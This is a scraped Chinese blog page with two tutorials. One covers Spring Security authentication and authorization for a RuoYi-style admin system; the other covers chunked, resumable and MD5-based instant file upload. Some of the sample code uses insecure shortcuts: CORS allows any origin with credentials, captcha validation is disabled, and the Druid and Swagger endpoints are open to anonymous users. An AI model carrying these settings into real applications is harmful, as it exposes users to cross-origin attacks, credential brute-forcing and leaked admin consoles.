75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类 */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); // 开启自动配置的登录功能 // http.formLogin() // .loginPage(\u0026#34;/toLogin\u0026#34;) //自定义登录页 // .loginProcessingUrl(\u0026#34;/loginRequest\u0026#34;) // 登陆表单提交的请求 // .passwordParameter(\u0026#34;password\u0026#34;); // 表单中password需与该处对应。默认是password // http.formLogin(); // 开启自动配置的注销的功能 // http.logout().logoutSuccessUrl(\u0026#34;/\u0026#34;); // 注销成功来到首页 // 记住我 // http.rememberMe(); // http.rememberMe(). // rememberMeParameter(\u0026#34;remember\u0026#34;); // 定制记住我的参数 } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 3.配置类相关模块 UserDetailsService 自定义用户认证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Service public class UserDetailsServiceImpl implements UserDetailsService { private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class); @Autowired private ISysUserService userService; @Autowired private SysPasswordService passwordService; @Autowired private SysPermissionService permissionService; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } AuthenticationEntryPointImpl 认证失败处理类 返回未授权\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Component public class AuthenticationEntryPointImpl implements AuthenticationEntryPoint, Serializable { private static final long serialVersionUID = -8970718410437077606L; @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException { int code = HttpStatus.UNAUTHORIZED; String msg = StringUtils.format(\u0026#34;请求访问：{}，认证失败，无法访问系统资源\u0026#34;, request.getRequestURI()); ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(code, msg))); } } LogoutSuccessHandlerImpl 自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } JwtAuthenticationTokenFiltertoken token过滤器 验证token有效性\nSecurityContextHolder 类最核心的作用，便是将当前给定的 SecurityContext 与 当前执行线程绑定，从而方便后续直接获取。\n在SecurityContextHolder中保存的是当前访问者的信息。Spring Security使用一个Authentication对象来表示这个信息。\n通过SecurityContextHolder.getContext().setAuthentication(authentication);方式将用户相关的信息存放到系统的安全上下文中，并且由于 SecurityContextHolder默认是mode_threadlocal模式，那么会将所有登录的用户信息都保存，每个登录的用户都可以通过SecurityContextHolder.getContext().getAuthentication();方式获取 当前自己保存的用户信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } ResourcesConfig 跨域过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration public class ResourcesConfig implements WebMvcConfigurer { /** * 跨域配置 */ @Bean public CorsFilter corsFilter() { CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); // 设置访问源地址 config.addAllowedOriginPattern(\u0026#34;*\u0026#34;); // 设置访问源请求头 config.addAllowedHeader(\u0026#34;*\u0026#34;); // 设置访问源请求方法 config.addAllowedMethod(\u0026#34;*\u0026#34;); // 有效期 1800秒 config.setMaxAge(1800L); // 添加映射路径，拦截一切请求 UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\u0026#34;/**\u0026#34;, config); // 返回新的CorsFilter return new CorsFilter(source); } } PermitAllUrlProperties 设置Anonymous注解允许匿名访问的url\n参考链接：\nApplicationContextAware接口的作用\n这个接口其实就是获取Spring容器的Bean，在我们写一些框架代码时，或者是看一些框架源码时经常会看到这个接口ApplicationContextAware 的使用，Spring容器会检测容器中的所有Bean，如果发现某个Bean实现了ApplicationContextAware接口，Spring容器会在创建该Bean之后，自动调用该Bean的setApplicationContextAware()方法，调用该方法时，会将容器本身作为参数传给该方法——该方法中的实现部分将Spring传入的参数（容器本身）赋给该类对象的applicationContext实例变量，因此接下来可以通过该applicationContext实例变量来访问容器本身\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @Configuration public class PermitAllUrlProperties implements InitializingBean, ApplicationContextAware { private static final Pattern PATTERN = Pattern.compile(\u0026#34;\\\\{(.*?)\\\\}\u0026#34;); private ApplicationContext applicationContext; private List\u0026lt;String\u0026gt; urls = new ArrayList\u0026lt;\u0026gt;(); public String ASTERISK = \u0026#34;*\u0026#34;; @Override public void afterPropertiesSet() { RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class); Map\u0026lt;RequestMappingInfo, HandlerMethod\u0026gt; map = mapping.getHandlerMethods(); map.keySet().forEach(info -\u0026gt; { HandlerMethod handlerMethod = map.get(info); // 获取方法上边的注解 替代path variable 为 * Anonymous method = AnnotationUtils.findAnnotation(handlerMethod.getMethod(), Anonymous.class); Optional.ofNullable(method).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); // 获取类上边的注解, 替代path variable 为 * Anonymous controller = AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), Anonymous.class); Optional.ofNullable(controller).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); }); } @Override public void setApplicationContext(ApplicationContext context) throws BeansException { this.applicationContext = context; } public List\u0026lt;String\u0026gt; getUrls() { return urls; } public void setUrls(List\u0026lt;String\u0026gt; urls) { this.urls = urls; } } 4.登录模块 authenticationManager.authenticate 会调用 UserDetailsServiceImpl.loadUserByUsername 进行身份认证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public String login(String username, String password, String code, String uuid) { // boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (false) { // validateCaptcha(username, code, uuid); } // 用户验证 Authentication authentication = null; try { UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(username, password); AuthenticationContextHolder.setContext(authenticationToken); // 该方法会去调用UserDetailsServiceImpl.loadUserByUsername authentication = authenticationManager.authenticate(authenticationToken); } catch (Exception e) { if (e instanceof BadCredentialsException) { String message = MessageUtils.message(\u0026#34;user.password.not.match\u0026#34;); asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, message); throw new ServiceException(message); } else { asyncService.recordLogininfor(username, Constants.LOGIN_FAIL, e.getMessage()); throw new ServiceException(e.getMessage()); } } asyncService.recordLogininfor(username, Constants.LOGIN_SUCCESS, MessageUtils.message(\u0026#34;user.login.success\u0026#34;)); LoginUser loginUser = (LoginUser) authentication.getPrincipal(); recordLoginInfo(loginUser.getUserId()); // 生成token return tokenService.createToken(loginUser); } 5.登出模块 SecurityConfig中添加登出过滤链\n1 2 // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); LogoutSuccessHandlerImpl自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } 6.注册模块 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public String register(RegisterDTO registerBody) { String msg = \u0026#34;\u0026#34;, username = registerBody.getUsername(), password = registerBody.getPassword(); boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (captchaEnabled) { // validateCaptcha(username, registerBody.getCode(), registerBody.getUuid()); } if (StringUtils.isEmpty(username)) { msg = \u0026#34;用户名不能为空\u0026#34;; } else if (StringUtils.isEmpty(password)) { msg = \u0026#34;用户密码不能为空\u0026#34;; } else if (username.length() \u0026lt; UserConstants.USERNAME_MIN_LENGTH || username.length() \u0026gt; UserConstants.USERNAME_MAX_LENGTH) { msg = \u0026#34;账户长度必须在2到20个字符之间\u0026#34;; } else if (password.length() \u0026lt; UserConstants.PASSWORD_MIN_LENGTH || password.length() \u0026gt; UserConstants.PASSWORD_MAX_LENGTH) { msg = \u0026#34;密码长度必须在5到20个字符之间\u0026#34;; } else if (UserConstants.NOT_UNIQUE.equals(userService.checkUserNameUnique(username))) { msg = \u0026#34;保存用户\u0026#39;\u0026#34; + username + \u0026#34;\u0026#39;失败，注册账号已存在\u0026#34;; } else { SysUser sysUser = new SysUser(); sysUser.setUserName(username); sysUser.setPassword(SecurityUtils.encryptPassword(registerBody.getPassword())); boolean regFlag = userService.registerUser(sysUser); if (!regFlag) { msg = \u0026#34;注册失败,请联系系统管理人员\u0026#34;; } else { asyncService.recordLogininfor(username, Constants.REGISTER, MessageUtils.message(\u0026#34;user.register.success\u0026#34;)); } } return msg; } 授权实现 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 -- ---------------------------- -- 角色信息表 -- ---------------------------- drop table if exists sys_role; create table sys_role ( role_id bigint(20) not null auto_increment comment \u0026#39;角色ID\u0026#39;, role_name varchar(30) not null comment \u0026#39;角色名称\u0026#39;, role_key varchar(100) not null comment \u0026#39;角色权限字符串\u0026#39;, role_sort int(4) not null comment \u0026#39;显示顺序\u0026#39;, data_scope char(1) default \u0026#39;1\u0026#39; comment \u0026#39;数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）\u0026#39;, menu_check_strictly tinyint(1) default 1 comment \u0026#39;菜单树选择项是否关联显示\u0026#39;, dept_check_strictly tinyint(1) default 1 comment \u0026#39;部门树选择项是否关联显示\u0026#39;, status char(1) not null comment \u0026#39;角色状态（0正常 1停用）\u0026#39;, del_flag char(1) default \u0026#39;0\u0026#39; comment \u0026#39;删除标志（0代表存在 2代表删除）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (role_id) ) engine=innodb auto_increment=100 comment = \u0026#39;角色信息表\u0026#39;; -- ---------------------------- -- 菜单权限表 -- ---------------------------- drop table if exists sys_menu; create table sys_menu ( menu_id bigint(20) not null auto_increment comment \u0026#39;菜单ID\u0026#39;, menu_name varchar(50) not null comment \u0026#39;菜单名称\u0026#39;, parent_id bigint(20) default 0 comment \u0026#39;父菜单ID\u0026#39;, order_num int(4) default 0 comment \u0026#39;显示顺序\u0026#39;, path varchar(200) default \u0026#39;\u0026#39; comment \u0026#39;路由地址\u0026#39;, component varchar(255) default null comment \u0026#39;组件路径\u0026#39;, query varchar(255) default null comment \u0026#39;路由参数\u0026#39;, is_frame int(1) default 1 comment \u0026#39;是否为外链（0是 1否）\u0026#39;, is_cache int(1) default 0 comment \u0026#39;是否缓存（0缓存 1不缓存）\u0026#39;, menu_type char(1) default \u0026#39;\u0026#39; comment \u0026#39;菜单类型（M目录 C菜单 F按钮）\u0026#39;, visible char(1) default 0 comment \u0026#39;菜单状态（0显示 1隐藏）\u0026#39;, status char(1) default 0 comment \u0026#39;菜单状态（0正常 1停用）\u0026#39;, perms varchar(100) default null comment \u0026#39;权限标识\u0026#39;, icon varchar(100) default \u0026#39;#\u0026#39; comment \u0026#39;菜单图标\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;备注\u0026#39;, primary key (menu_id) ) engine=innodb auto_increment=2000 comment = \u0026#39;菜单权限表\u0026#39;; -- ---------------------------- -- 角色和菜单关联表 角色1-N菜单 -- ---------------------------- drop table if exists sys_role_menu; create table sys_role_menu ( role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, menu_id bigint(20) not null comment \u0026#39;菜单ID\u0026#39;, primary key(role_id, menu_id) ) engine=innodb comment = \u0026#39;角色和菜单关联表\u0026#39;; -- ---------------------------- -- 用户和角色关联表 用户N-1角色 -- ---------------------------- drop table if exists sys_user_role; create table sys_user_role ( user_id bigint(20) not null comment \u0026#39;用户ID\u0026#39;, role_id bigint(20) not null comment \u0026#39;角色ID\u0026#39;, primary key(user_id, role_id) ) engine=innodb comment = \u0026#39;用户和角色关联表\u0026#39;; 2.权限过滤器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken); } chain.doFilter(request, response); } } 3.登录时权限赋值 在 UserDetailsServiceImpl 的 loadUserByUsername 中为user赋上权限\n4.权限查询Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;select id=\u0026#34;selectMenuListByUserId\u0026#34; parameterType=\u0026#34;SysMenu\u0026#34; resultMap=\u0026#34;SysMenuResult\u0026#34;\u0026gt; select distinct m.menu_id, m.parent_id, m.menu_name, m.path, m.component, m.`query`, m.visible, m.status, ifnull(m.perms,\u0026#39;\u0026#39;) as perms, m.is_frame, m.is_cache, m.menu_type, m.icon, m.order_num, m.create_time from sys_menu m left join sys_role_menu rm on m.menu_id = rm.menu_id left join sys_user_role ur on rm.role_id = ur.role_id left join sys_role ro on ur.role_id = ro.role_id where ur.user_id = #{params.userId} \u0026lt;if test=\u0026#34;menuName != null and menuName != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.menu_name like concat(\u0026#39;%\u0026#39;, #{menuName}, \u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;visible != null and visible != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.visible = #{visible} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;status != null and status != \u0026#39;\u0026#39;\u0026#34;\u0026gt; AND m.status = #{status} \u0026lt;/if\u0026gt; order by m.parent_id, m.order_num \u0026lt;/select\u0026gt; 5.自定义权限方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Service(\u0026#34;ss\u0026#34;) public class PermissionService { /** 所有权限标识 */ private static final String ALL_PERMISSION = \u0026#34;*:*:*\u0026#34;; /** 管理员角色权限标识 */ private static final String SUPER_ADMIN = \u0026#34;admin\u0026#34;; private static final String ROLE_DELIMETER = \u0026#34;,\u0026#34;; private static final String PERMISSION_DELIMETER = \u0026#34;,\u0026#34;; /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } } 6.接口实现 1 2 3 4 5 6 7 8 9 10 /** * 获取菜单列表 */ @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } ","permalink":"https://chance7bin.github.io/posts/note/spring-security/","summary":"参考链接： https://blog.csdn.net/liuminglei1987/category_10122574.html 从零搭建若依(Ruoyi-Vue)管理系统(10)\u0026ndash;Spring Security核心内容梳理 SpringSecuri","title":"Spring Security"},{"content":" 本篇文章主要内容是分片上传、断点续传、秒传的实现思路\n前言 分片： 分片任务是在前端由vue-simple-uploader插件完成，流程：1.前端先发送check-file（检查文件MD5）来确认文件是直接秒传还是分片上传，如果计算出文件所有片已经上传完成，则启用秒传（秒传就是不传），如果是新文件，则需要分片上传，由vue-simple-uploader插件将文件按固定大小进行切割，然后逐片上传。\n断点续传： 意思就是一个大文件分了多少片，这些片已经上传了哪些，还有哪些没上传，这些都会记录在文件存储目录下的.conf文件中，当你上传大文件时，传一部分后刷新浏览器或关闭浏览器，这时候传输会中断，然后你再打开页面重新上传该文件，它会先检测还有哪些片没有上传，然后直接上传的上次未传的片，这就是断点续传。\n**秒传：**文件不经过上传的步骤，直接将文件信息保存在服务器中。通过计算文件md5实现\n流程 校验文件上传状态： 前端生成该文件的MD5密文并进行分片，上传之前请求check-md5接口，传入文件名和密文，接口校验文件是未上传 或 上传了一部分 或 已上传完成三个状态，其中未上传返回自定义状态码404，上传一部分则返回状态206+未上传的分片ID，上传完成则返回状态200。 前端逐片上传： 校验完成后，根据校验结果对未上传的分片进行逐个上传，上传分片时参数主要是：总片数、当前片ID、片文件 上传接口： 上传接口会先去获取并解析该文件的conf文件（conf文件是RandomAccessFile，该类是通过提供指针的方式操作文件，文件存储的是一个二进制数组，所以可以用来数组下标标记片ID），使用setLength方法设置conf文件长度，使用seek方法跳到当前上传的片ID的位置，把该位置的值替换成127，然后将该分片使用指针偏移的方式插入到_tmp临时文件（临时文件也是RandomAccessFile文件）中，然后校验是否所有的片都上传完成，是则修改临时文件为正式文件名，至此上传完成，否则直接返回该分片上传完成 上传进度： 前端收到当前片的响应结果后，会根据已上传片数量获取到上传进度 MD5的用法： 用于计算服务器是否已经存在相同md5的文件，用作秒传功能的实现。前端计算文件md5，传入后端进行查找是否已经有相同md5文件，若存在直接返回上传成功，否则走上传的步骤 后端接口 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 /** * 检查文件MD5（文件MD5若已存在进行秒传） * * @param md5 md5 * @param fileName 文件名称 * @return {@link ApiResponse} * @author 7bin **/ @GetMapping(value = \u0026#34;/check\u0026#34;) public ApiResponse checkFileMd5(String md5, String fileName) { // Result result = fileService.checkFileMd5(md5, fileName); // return NovelWebUtils.forReturn(result); return ApiResponse.success(); } /** * 断点续传方式上传文件：用于大文件上传 * * @param chunkDTO 参数 * @param request 请求 * @return {@link ApiResponse} * @author 7bin **/ @PostMapping(value = \u0026#34;/breakpoint-upload\u0026#34;, consumes = \u0026#34;multipart/*\u0026#34;, headers = \u0026#34;content-type=multipart/form-data\u0026#34;, produces = \u0026#34;application/json;charset=UTF-8\u0026#34;) public ApiResponse breakpointResumeUpload(Chunk chunkDTO, HttpServletRequest request) { String id = chunkDTO.getIdentifier(); int chunks = Math.toIntExact(chunkDTO.getTotalChunks()); int chunk = chunkDTO.getChunkNumber() - 1; long size = chunkDTO.getCurrentChunkSize(); String name = chunkDTO.getFilename(); MultipartFile file = chunkDTO.getFile(); String md5 = chunkDTO.getIdentifier(); UploadFileParam param = new UploadFileParam(id, chunks, chunk, size, name, file, md5); // return ApiResponse.success(); Result result = fileService.breakpointResumeUpload(param, request); return NovelWebUtils.forReturn(result); } /** * 检查文件MD5（文件MD5若已存在进行秒传） * @param chunkMap * @return {@link ApiResponse} * @author 7bin **/ @GetMapping(value = \u0026#34;/breakpoint-upload\u0026#34;) public ApiResponse breakpointResumeUploadPre( @RequestParam Map\u0026lt;String, String\u0026gt; chunkMap) { String md5 = chunkMap.get(\u0026#34;identifier\u0026#34;); String filename = chunkMap.get(\u0026#34;filename\u0026#34;); Result\u0026lt;JSONArray\u0026gt; result = fileService.checkFileMd5(md5, filename); JSONObject res = new JSONObject(); // 数据库中存在该md5则秒传 if (result == null){ res.put(\u0026#34;skipUpload\u0026#34;,true); return ApiResponse.success(res); } boolean skipUpload = false; if (\u0026#34;200\u0026#34;.equals(result.getCode()) || \u0026#34;201\u0026#34;.equals(result.getCode())) { skipUpload = true; } else if (\u0026#34;206\u0026#34;.equals(result.getCode())) { // 已经上传部分分块 // data中存放的是还未上传的分块 JSONArray data = result.getData(); res.put(\u0026#34;missChunks\u0026#34;,data); } res.put(\u0026#34;skipUpload\u0026#34;,skipUpload); return ApiResponse.success(res); // Result result = fileService.breakpointResumeUpload(param, request); // return NovelWebUtils.forReturn(result); } Service\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 @Override public Result\u0026lt;JSONArray\u0026gt; checkFileMd5(String md5, String fileName) { boolean exist = fileMapper.fileIsExist(md5); if (exist){ return null; } Result\u0026lt;JSONArray\u0026gt; result; try { // String realFilename = md5 + \u0026#34;_\u0026#34; + fileName; String realFilename = md5; result = LocalUpload.checkFileMd5(md5, realFilename, confFilePath, savePath); } catch (Exception e) { // e.printStackTrace(); log.error(e.getMessage()); throw new ServiceException(e.getMessage()); } return result; } @Override public Result breakpointResumeUpload(UploadFileParam param, HttpServletRequest request) { Result result; try { // 这里的 chunkSize(分片大小) 要与前端传过来的大小一致 // long chunkSize = Objects.isNull(param.getChunkSize()) ? 5 * 1024 * 1024 // : param.getChunkSize(); // 实际存储的文件格式为 [{md5}_{filename}] // String realFilename = param.getMd5() + \u0026#34;_\u0026#34; + param.getName(); String realFilename = param.getMd5(); param.setName(realFilename); result = LocalUpload.fragmentFileUploader(param, confFilePath, savePath, 5242880L, request); // return NovelWebUtils.forReturn(result); } catch (Exception e) { log.error(e.getMessage()); throw new ServiceException(e.getMessage()); } return result; } 前端代码 SimpleUploader.vue\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 